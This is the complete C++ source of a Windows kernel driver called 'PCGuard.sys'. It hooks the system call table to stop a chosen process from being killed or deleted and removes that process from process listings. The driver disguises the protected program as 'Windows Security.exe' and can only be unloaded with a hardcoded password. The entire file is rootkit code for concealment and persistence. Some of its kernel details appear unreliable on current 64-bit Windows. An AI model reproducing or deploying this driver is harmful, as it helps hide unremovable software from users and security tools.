/*
 * PCGuard.sys — PC Guardian Kernel Driver
 * Hooks NtTerminateProcess, NtDeleteFile, hides process from list
 * Password: DECDRV
 */

// Force include shared headers before ntddk.h
#include <ntdef.h>
#include <ntddk.h>
#include <wdm.h>
#include "PCGuard.h"

// ── GLOBALS ──────────────────────────────────────────────────────────────────

ULONG  g_ProtectedPID    = 0;
WCHAR  g_ProtectedName[] = L"Windows Security.exe";
WCHAR  g_Password[]      = L"DECDRV";
BOOLEAN g_Hooked         = FALSE;

typedef NTSTATUS (NTAPI* fnNtTerminateProcess)(HANDLE, NTSTATUS);
typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI* fnNtDeleteFile)(POBJECT_ATTRIBUTES);

fnNtTerminateProcess        g_OrigTerminateProcess       = nullptr;
fnNtQuerySystemInformation  g_OrigQuerySysInfo           = nullptr;
fnNtDeleteFile              g_OrigDeleteFile             = nullptr;

PULONG_PTR g_SSDT = nullptr;

// ── DEVICE ───────────────────────────────────────────────────────────────────

#define DEVICE_NAME   L"\\Device\\PCGuard"
#define SYMBOLIC_LINK L"\\DosDevices\\PCGuard"

#define IOCTL_SET_PID CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNLOAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ── SYSTEM PROCESS INFO ───────────────────────────────────────────────────────

typedef struct _SYSTEM_PROCESS_INFO {
    ULONG           NextEntryOffset;
    ULONG           NumberOfThreads;
    LARGE_INTEGER   WorkingSetPrivateSize;
    ULONG           HardFaultCount;
    ULONG           NumberOfThreadsHighWatermark;
    ULONGLONG       CycleTime;
    LARGE_INTEGER   CreateTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   KernelTime;
    UNICODE_STRING  ImageName;
    LONG            BasePriority;
    HANDLE          UniqueProcessId;
    HANDLE          InheritedFromUniqueProcessId;
    ULONG           HandleCount;
    ULONG           SessionId;
    ULONG_PTR       UniqueProcessKey;
    SIZE_T          PeakVirtualSize;
    SIZE_T          VirtualSize;
    ULONG           PageFaultCount;
    SIZE_T          PeakWorkingSetSize;
    SIZE_T          WorkingSetSize;
    SIZE_T          QuotaPeakPagedPoolUsage;
    SIZE_T          QuotaPagedPoolUsage;
    SIZE_T          QuotaPeakNonPagedPoolUsage;
    SIZE_T          QuotaNonPagedPoolUsage;
    SIZE_T          PagefileUsage;
    SIZE_T          PeakPagefileUsage;
    SIZE_T          PrivatePageCount;
    LARGE_INTEGER   ReadOperationCount;
    LARGE_INTEGER   WriteOperationCount;
    LARGE_INTEGER   OtherOperationCount;
    LARGE_INTEGER   ReadTransferCount;
    LARGE_INTEGER   WriteTransferCount;
    LARGE_INTEGER   OtherTransferCount;
} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;

// ── SSDT HELPERS ──────────────────────────────────────────────────────────────

PULONG_PTR GetSSDTBase()
{
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"KeServiceDescriptorTable");
    PULONG_PTR ksdt = (PULONG_PTR)MmGetSystemRoutineAddress(&name);
    if (!ksdt) return nullptr;
    return (PULONG_PTR)(*(PULONG_PTR)ksdt);
}

VOID DisableWP(ULONG_PTR* cr0) { *cr0 = __readcr0(); __writecr0(*cr0 & ~0x10000UL); _disable(); }
VOID EnableWP(ULONG_PTR cr0)   { _enable(); __writecr0(cr0); }

// Hardcoded syscall indexes for Windows 10/11
#define IDX_NtTerminateProcess       0x002C
#define IDX_NtDeleteFile             0x000D
#define IDX_NtQuerySystemInformation 0x0036

// ── HOOKED NtTerminateProcess ─────────────────────────────────────────────────

NTSTATUS NTAPI HookedNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus)
{
    if (g_ProtectedPID && ProcessHandle != NtCurrentProcess())
    {
        PEPROCESS pProc = nullptr;
        if (NT_SUCCESS(ObReferenceObjectByHandle(ProcessHandle, PROCESS_QUERY_INFORMATION,
            *PsProcessType, KernelMode, (PVOID*)&pProc, nullptr)))
        {
            ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(pProc);
            ObDereferenceObject(pProc);
            if (pid == g_ProtectedPID)
            {
                DbgPrint("[PCGuard] Kill blocked PID=%lu\n", pid);
                return STATUS_ACCESS_DENIED;
            }
        }
    }
    return g_OrigTerminateProcess(ProcessHandle, ExitStatus);
}

// ── HOOKED NtDeleteFile ───────────────────────────────────────────────────────

NTSTATUS NTAPI HookedNtDeleteFile(POBJECT_ATTRIBUTES ObjAttr)
{
    if (ObjAttr && ObjAttr->ObjectName && ObjAttr->ObjectName->Buffer)
    {
        UNICODE_STRING* n  = ObjAttr->ObjectName;
        UNICODE_STRING  pn;
        RtlInitUnicodeString(&pn, g_ProtectedName);
        USHORT nlen  = n->Length  / sizeof(WCHAR);
        USHORT pnlen = pn.Length  / sizeof(WCHAR);
        for (USHORT i = 0; i + pnlen <= nlen; i++)
        {
            if (_wcsnicmp(n->Buffer + i, pn.Buffer, pnlen) == 0)
            {
                DbgPrint("[PCGuard] Delete blocked\n");
                return STATUS_ACCESS_DENIED;
            }
        }
    }
    return g_OrigDeleteFile(ObjAttr);
}

// ── HOOKED NtQuerySystemInformation (process hiding) ─────────────────────────

NTSTATUS NTAPI HookedNtQuerySystemInformation(ULONG Class, PVOID Info, ULONG Len, PULONG Ret)
{
    NTSTATUS st = g_OrigQuerySysInfo(Class, Info, Len, Ret);
    if (!NT_SUCCESS(st) || Class != 5 || !Info || !g_ProtectedPID) return st;

    PSYSTEM_PROCESS_INFO cur  = (PSYSTEM_PROCESS_INFO)Info;
    PSYSTEM_PROCESS_INFO prev = nullptr;

    while (TRUE)
    {
        if ((ULONG)(ULONG_PTR)cur->UniqueProcessId == g_ProtectedPID)
        {
            if (prev)
                prev->NextEntryOffset = cur->NextEntryOffset
                    ? prev->NextEntryOffset + cur->NextEntryOffset : 0;
        }
        else
        {
            prev = cur;
        }
        if (!cur->NextEntryOffset) break;
        cur = (PSYSTEM_PROCESS_INFO)((ULONG_PTR)cur + cur->NextEntryOffset);
    }
    return st;
}

// ── INSTALL / REMOVE HOOKS ────────────────────────────────────────────────────

NTSTATUS InstallHooks()
{
    g_SSDT = GetSSDTBase();
    if (!g_SSDT) return STATUS_UNSUCCESSFUL;

    ULONG_PTR cr0;
    DisableWP(&cr0);
    g_OrigTerminateProcess = (fnNtTerminateProcess)       g_SSDT[IDX_NtTerminateProcess];
    g_OrigDeleteFile       = (fnNtDeleteFile)              g_SSDT[IDX_NtDeleteFile];
    g_OrigQuerySysInfo     = (fnNtQuerySystemInformation)  g_SSDT[IDX_NtQuerySystemInformation];
    g_SSDT[IDX_NtTerminateProcess]       = (ULONG_PTR)HookedNtTerminateProcess;
    g_SSDT[IDX_NtDeleteFile]             = (ULONG_PTR)HookedNtDeleteFile;
    g_SSDT[IDX_NtQuerySystemInformation] = (ULONG_PTR)HookedNtQuerySystemInformation;
    EnableWP(cr0);

    g_Hooked = TRUE;
    DbgPrint("[PCGuard] Hooks installed\n");
    return STATUS_SUCCESS;
}

VOID RemoveHooks()
{
    if (!g_Hooked || !g_SSDT) return;
    ULONG_PTR cr0;
    DisableWP(&cr0);
    if (g_OrigTerminateProcess) g_SSDT[IDX_NtTerminateProcess]       = (ULONG_PTR)g_OrigTerminateProcess;
    if (g_OrigDeleteFile)       g_SSDT[IDX_NtDeleteFile]             = (ULONG_PTR)g_OrigDeleteFile;
    if (g_OrigQuerySysInfo)     g_SSDT[IDX_NtQuerySystemInformation] = (ULONG_PTR)g_OrigQuerySysInfo;
    EnableWP(cr0);
    g_Hooked = FALSE;
}

// ── IOCTL ─────────────────────────────────────────────────────────────────────

NTSTATUS HandleIoctl(PDEVICE_OBJECT, PIRP Irp)
{
    PIO_STACK_LOCATION stk = IoGetCurrentIrpStackLocation(Irp);
    ULONG code  = stk->Parameters.DeviceIoControl.IoControlCode;
    ULONG inLen = stk->Parameters.DeviceIoControl.InputBufferLength;
    PVOID inBuf = Irp->AssociatedIrp.SystemBuffer;
    NTSTATUS st = STATUS_SUCCESS;

    if (code == IOCTL_SET_PID && inLen >= sizeof(ULONG) && inBuf)
    {
        g_ProtectedPID = *(PULONG)inBuf;
        DbgPrint("[PCGuard] Protecting PID %lu\n", g_ProtectedPID);
    }
    else if (code == IOCTL_UNLOAD && inLen >= 10 && inBuf)
    {
        if (_wcsicmp((WCHAR*)inBuf, g_Password) == 0)
            { RemoveHooks(); g_ProtectedPID = 0; }
        else
            st = STATUS_ACCESS_DENIED;
    }
    else st = STATUS_INVALID_DEVICE_REQUEST;

    Irp->IoStatus.Status = st; Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return st;
}

NTSTATUS DispatchAny(PDEVICE_OBJECT, PIRP Irp)
{
    Irp->IoStatus.Status = STATUS_SUCCESS; Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT drv)
{
    RemoveHooks();
    UNICODE_STRING sym; RtlInitUnicodeString(&sym, SYMBOLIC_LINK);
    IoDeleteSymbolicLink(&sym);
    if (drv->DeviceObject) IoDeleteDevice(drv->DeviceObject);
}

// ── ENTRY ─────────────────────────────────────────────────────────────────────

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING)
{
    DbgPrint("[PCGuard] Loading...\n");

    UNICODE_STRING dn; RtlInitUnicodeString(&dn, DEVICE_NAME);
    PDEVICE_OBJECT dev = nullptr;
    NTSTATUS st = IoCreateDevice(drv, 0, &dn, FILE_DEVICE_UNKNOWN,
                                 FILE_DEVICE_SECURE_OPEN, FALSE, &dev);
    if (!NT_SUCCESS(st)) return st;

    UNICODE_STRING sl; RtlInitUnicodeString(&sl, SYMBOLIC_LINK);
    st = IoCreateSymbolicLink(&sl, &dn);
    if (!NT_SUCCESS(st)) { IoDeleteDevice(dev); return st; }

    drv->DriverUnload = DriverUnload;
    for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        drv->MajorFunction[i] = DispatchAny;
    drv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HandleIoctl;
    dev->Flags |= DO_BUFFERED_IO;
    dev->Flags &= ~DO_DEVICE_INITIALIZING;

    InstallHooks();
    DbgPrint("[PCGuard] Ready. Protecting PID=%lu\n", g_ProtectedPID);
    return STATUS_SUCCESS;
}
